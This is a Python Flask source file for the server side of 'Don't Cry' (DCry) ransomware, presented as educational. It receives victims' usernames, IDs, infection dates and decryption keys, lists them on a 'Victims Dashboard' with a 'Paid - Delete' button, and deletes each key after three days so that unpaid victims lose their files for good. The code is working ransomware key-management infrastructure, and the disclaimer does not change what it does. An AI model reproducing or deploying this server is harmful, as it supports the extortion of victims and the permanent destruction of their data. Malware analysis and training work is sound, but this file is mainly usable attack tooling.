################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
# research, ethical hacking education, and malware analysis training only.
# It mimics behavior of real ransomware but must NOT be used for illegal or
# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
# under supervision of cybersecurity professionals.
# The authors assume no liability for any misuse or damage caused.

import re
import os
import shutil
from datetime import datetime, timedelta
from markupsafe import escape as flask_escape
from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))

os.makedirs(VICTIM_FOLDER, exist_ok=True)


def sanitize_path_component(component):
    if not component:
        return "_"
    component = re.sub(r"[^a-zA-Z0-9_-]", "_", component)
    if component == "." or component == "..":
        return "_"
    return component


def victim_is_expired(date_str, days_valid=3):
    try:
        infected_date = datetime.strptime(date_str, "%Y-%m-%d")
        return datetime.now() > infected_date + timedelta(days=days_valid)
    except Exception:
        return False


def delete_victim(victim_id):
    path = os.path.join(VICTIM_FOLDER, victim_id)
    if os.path.isdir(path):
        shutil.rmtree(path)


@app.route("/upload", methods=["POST"])
def upload():
    username = request.form.get("username", "")
    vid = sanitize_path_component(request.form.get("id", ""))
    date = request.form.get("date", "")
    key = request.form.get("key", "")

    if not vid or vid == "_":
        return "Invalid victim ID.", 400

    folder = os.path.join(VICTIM_FOLDER, vid)
    os.makedirs(folder, exist_ok=True)

    info_path = os.path.join(folder, "info.txt")
    with open(info_path, "w") as f:
        f.write(f"username={username}\n")
        f.write(f"date={date}\n")

    key_path = os.path.join(folder, "key.txt")
    with open(key_path, "w") as f:
        f.write(key)

    return "Upload success."


@app.route("/dashboard")
def dashboard():
    victims_data = []
    try:
        for vid in os.listdir(VICTIM_FOLDER):
            vid_safe = sanitize_path_component(vid)
            if not vid_safe or vid_safe == "_":
                continue

            folder = os.path.join(VICTIM_FOLDER, vid_safe)
            info_path = os.path.join(folder, "info.txt")
            key_path = os.path.join(folder, "key.txt")

            if not os.path.isfile(info_path) or not os.path.isfile(key_path):
                continue

            try:
                info = {}
                with open(info_path, "r") as f:
                    for line in f:
                        if "=" in line:
                            k, v = line.strip().split("=", 1)
                            info[k] = v

                if victim_is_expired(info.get("date", ""), 3):
                    delete_victim(vid_safe)
                    continue

                with open(key_path, "r") as f:
                    key = f.read()

                victims_data.append(
                    {
                        "username": flask_escape(info.get("username", "")),
                        "id": flask_escape(vid_safe),
                        "date": flask_escape(info.get("date", "")),
                        "key": flask_escape(key),
                    }
                )
            except Exception as e:
                app.logger.error(f"Error reading victim data for {vid_safe}: {e}")
                continue
    except Exception as e:
        app.logger.error(f"Error listing victims: {e}")

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>DCry Victims Dashboard</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body { background: #121212; color: #eee; font-family: monospace; }
            table { border-collapse: collapse; width: 100%; }
            th, td { padding: 8px; border: 1px solid #555; }
            th { background: #222; }
            tr:hover { background: #333; }
            button { cursor: pointer; background: #007acc; color: white; border: none; padding: 5px 10px; border-radius: 3px; }
            button:hover { background: #005f99; }
        </style>
    </head>
    <body>
        <h1>DCry Victims Dashboard</h1>
        <table>
            <thead>
                <tr>
                    <th>Username</th><th>ID (folder)</th><th>Infected Date</th><th>Key</th><th>Action</th>
                </tr>
            </thead>
            <tbody>
            {% for v in victims %}
                <tr>
                    <td>{{ v.username }}</td>
                    <td>{{ v.id }}</td>
                    <td>{{ v.date }}</td>
                    <td><pre style="margin:0;">{{ v.key }}</pre></td>
                    <td>
                        <form method="post" action="{{ url_for('delete_victim_route') }}" onsubmit="return confirm('Delete victim {{ v.id }}?');">
                            <input type="hidden" name="victim_id" value="{{ v.id }}">
                            <button type="submit">Paid - Delete</button>
                        </form>
                    </td>
                </tr>
            {% endfor %}
            </tbody>
        </table>
    </body>
    </html>
    """

    return render_template_string(html, victims=victims_data)


@app.route("/delete_victim", methods=["POST"])
def delete_victim_route():
    victim_id_raw = request.form.get("victim_id")
    victim_id = sanitize_path_component(victim_id_raw)
    if not victim_id or victim_id == "_":
        return "Invalid victim ID.", 400
    delete_victim(victim_id)
    return redirect(url_for("dashboard"))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
